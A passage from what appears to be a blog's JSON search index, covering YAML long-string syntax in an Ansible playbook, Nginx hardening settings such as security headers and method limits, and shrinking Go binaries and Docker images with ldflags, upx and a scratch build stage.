則可以讓字串跟定義的一致，在 YAML 裡看到換行，那字串裡就會有換行符號。\n--- - name: Test long string hosts: all vars: s1: \u0026#34;hello\u0026#34; s2: | s2 this is my very very very long string line1 line2 line3 s3: \u0026gt; s3 this is my very very very long string line1 line2 line3 s4: |- s4 this is my very very very long string line1 line2 line3 s5: \u0026gt;- s5 this is my very very very long string line1 line2 line3 tasks: - name: s1 copy: content: \u0026#34;{{ s1 }}\u0026#34; dest: \u0026#34;/tmp/s1.txt\u0026#34; # hello% - name: s2 copy: content: \u0026#34;{{ s2 }}\u0026#34; dest: \u0026#34;/tmp/s2.txt\u0026#34; # s2 # this is my very very very # long string # line1 # line2 # line3 - name: s3 copy: content: \u0026#34;{{ s3 }}\u0026#34; dest: \u0026#34;/tmp/s3.txt\u0026#34; # s3 this is my very very very long string line1 line2 line3 - name: s4 copy: content: \u0026#34;{{ s4 }}\u0026#34; dest: \u0026#34;/tmp/s4.txt\u0026#34; # s4 # this is my very very very # long string # line1 # line2 # line3% - name: s5 copy: content: \u0026#34;{{ s5 }}\u0026#34; dest: \u0026#34;/tmp/s5.txt\u0026#34; # s5 this is my very very very long string line1 line2 line3% ","date":"August 29, 2022","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220829-long-string-in-yaml/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/long-string-in-yaml/\" target=\"_blank\" rel=\"noopener\"\u003eYAML 裡的字串很長該怎麼做？\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在 YAML 裡已經有規範此部份，在這種情況有四種方法可以幫助我們：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e|\u003c/code\u003e: 其下內容的換行，就是換行，最後一行會有換行。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026gt;\u003c/code\u003e: 其下內容的換行，不會是換行，會變為一個很長的字串，最後會有換行。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e|-\u003c/code\u003e: 其下內容的換行，就是換行，但最後一行不會有換行。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026gt;-\u003c/code\u003e: 其下內容的換常，不會是換行，最後一行也不會有換行。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e簡單的說，\u003ccode\u003e\u0026gt;\u003c/code\u003e 跟 \u003ccode\u003e\u0026gt;-\u003c/code\u003e 可以增加 YAML 的可讀性，又不會有多餘的換行符號。而 \u003ccode\u003e|\u003c/code\u003e 跟 \u003ccode\u003e|-\u003c/code\u003e 則可以讓字串跟定義的一致，在 YAML 裡看到換行，那字串裡就會有換行符號。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eTest long string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ehosts\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003evars\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es1\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es2\u003c/span\u003e: |\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      s2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      this is my very very very\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      long string\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es3\u003c/span\u003e: \u0026gt;\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      s3\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      this is my very very very\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      long string\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es4\u003c/span\u003e: |-\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      s4\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      this is my very very very\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      long string\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es5\u003c/span\u003e: \u0026gt;-\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      s5\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      this is my very very very\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      long string\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etasks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s1 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s1.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# hello%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s2 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s2.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# s2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# this is my very very very\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# long string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s3 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s3.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# s3 this is my very very very long string line1 line2 line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s4 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s4.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# s4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# this is my very very very\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# long string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line3%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s5 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s5.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# s5 this is my very very very long string line1 line2 line3%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Ansible","YAML"],"title":"YAML 裡的字串很長該怎麼做？"},{"categories":["URL","NGINX"],"contents":" Top 25 Nginx Tips and Tricks From Practical Experience\nserver_tokens off;\nssl_protocols TLSv1.2 TLSv1.3;\nDisable any undesirable HTTP methods\nlocation / { limit_except GET HEAD POST { deny all; } } Enable sysctl based protection net.ipv4.conf.all.rp_filter = 1 net.ipv4.tcp_syncookies = 1 Stop image hotlinking location /images/ { valid_referers none blocked www.domain.com domain.com; if ($invalid_referer) { return 403; } } add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection \u0026quot;1; mode=block\u0026quot;; add_header Strict-Transport-Security \u0026quot;max-age=31536000; includeSubDomains; preload\u0026quot; always; ","date":"August 10, 2022","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220810-top-25-nginx-tips-and-tricks-from-practical-experience/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://hackernoon.com/top-25-nginx-tips-and-tricks-from-practical-experience\" target=\"_blank\" rel=\"noopener\"\u003eTop 25 Nginx Tips and Tricks From Practical Experience\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eserver_tokens off;\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003essl_protocols TLSv1.2 TLSv1.3;\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eDisable any undesirable HTTP methods\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_except\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eGET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHEAD\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ePOST\u003c/span\u003e { \u003cspan style=\"color:#f92672\"\u003edeny\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eall\u003c/span\u003e; }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eEnable sysctl based protection\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet.ipv4.conf.all.rp_filter \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet.ipv4.tcp_syncookies \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eStop image hotlinking\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/images/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003evalid_referers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enone\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eblocked\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewww.domain.com\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edomain.com\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#f92672\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e(\u003c/span\u003e$invalid_referer\u003cspan style=\"color:#e6db74\"\u003e)\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e403\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eadd_header X-Content-Type-Options nosniff;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eadd_header X-XSS-Protection \u0026quot;1; mode=block\u0026quot;;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eadd_header Strict-Transport-Security \u0026quot;max-age=31536000; includeSubDomains; preload\u0026quot; always;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","NGINX"],"title":"Top 25 Nginx Tips and Tricks From Practical Experience"},{"categories":["URL","Go","Docker"],"contents":" 為你的 Go 應用建立輕量級 Docker 映象？ | IT 人 go build # default $ go build -o test1 main.go $ du -sh test1 14M test1 # 在程式編譯的時候可以加上 `-ldflags \u0026#34;-s -w\u0026#34;` 引數來優化編譯，原理是通過去除部分連結和除錯等資訊來減小編譯生成的可執行程式體積，具體引數如下： # -a：強制編譯所有依賴包 # -s：去掉符號表資訊，不過 panic 的時候 stack trace 就沒有任何檔名/行號資訊了 # -w：去掉 DWARF 除錯資訊，不過得到的程式就不能使用 gdb 進行除錯了 # 若對符號表無需求，-ldflags 直接新增 \u0026#34;-s\u0026#34; 即可 # 注：不建議-w和-s同時使用 $ go build -ldflags \u0026#34;-s -w\u0026#34; -o test2 main.go $ du -sh test2 11M test2 upx(brew/yum install upx) $ upx test2 Ultimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX 3.96 Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 11490768 -\u0026gt; 4063248 35.36% macho/amd64 test2 Packed 1 file. $ upx --brute test2 $ du -sh test2 4.6M test2 upx 的壓縮選項\n-o: 指定輸出的檔名 -k: 保留備份原檔案 -1: 最快壓縮，共 1-9 九個級別 -9: 最優壓縮，與上面對應 -d: 解壓縮 decompress，恢復原體積 -l: 顯示壓縮檔案的詳情，例如 upx -l main.exe -t: 測試壓縮檔案，例如 upx -t main.exe -q: 靜默壓縮 be quiet -v: 顯示壓縮細節 be verbose -f: 強制壓縮 -V: 顯示版本號 -h: 顯示幫助資訊 --brute: 嘗試所有可用的壓縮方法，slow --ultra-brute: 比樓上更極端，very slow upx 壓縮後的程式和壓縮前的程式一樣，無需解壓仍然能夠正常地執行，這種壓縮方法稱之為帶殼壓縮，壓縮包含兩個部分:\n在程式開頭或其他合適的地方插入解壓程式碼； 將程式的其他部分壓縮; 執行時，也包含兩個部分:\n首先執行的是程式開頭的插入的解壓程式碼，將原來的程式在記憶體中解壓出來； 再執行解壓後的程式; 也就是說，upx 在程式執行時，會有額外的解壓動作，不過這個耗時幾乎可以忽略。\ndocker image FROM golang:alpine AS build # 為我們的映象設定必要的環境變數 ENV GO111MODULE=on CGO_ENABLED=0 GOOS=linux GOARCH=amd64 GOPROXY=\u0026#34;https://goproxy.io\u0026#34; # 移動到工作目錄：/build WORKDIR $GOPATH/src/gin_docker # 將程式碼複製到容器中 ADD . ./ # 將我們的程式碼編譯成二進位制可執行檔案 app RUN go build -ldflags \u0026#34;-s -w\u0026#34; -o app FROM scratch AS prod # 從builder映象中把/go/src/gin_docker 拷貝到當前目錄 # 設定應用程式以非 root 使用者身份運行 # User ID 65534 通常是 \u0026#39;nobody\u0026#39; 使用者 # 映像的執行者仍應在安裝過程中指定一個使用者。 COPY --chown=65534:0 --from=build /go/src/gin_docker . USER 65534 # 需要執行的命令 CMD [\u0026#34;./app\u0026#34;] ","date":"July 25, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220725-build-lightweight-docker-image-for-go-app/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://iter01.com/605065.html\" target=\"_blank\" rel=\"noopener\"\u003e為你的 Go 應用建立輕量級 Docker 映象？ | IT 人\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"go-build\"\u003ego build\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# default\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build -o test1 main.go\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ du -sh test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e14M    test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 在程式編譯的時候可以加上 `-ldflags \u0026#34;-s -w\u0026#34;` 引數來優化編譯，原理是通過去除部分連結和除錯等資訊來減小編譯生成的可執行程式體積，具體引數如下：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -a：強制編譯所有依賴包\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -s：去掉符號表資訊，不過 panic 的時候 stack trace 就沒有任何檔名/行號資訊了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -w：去掉 DWARF 除錯資訊，不過得到的程式就不能使用 gdb 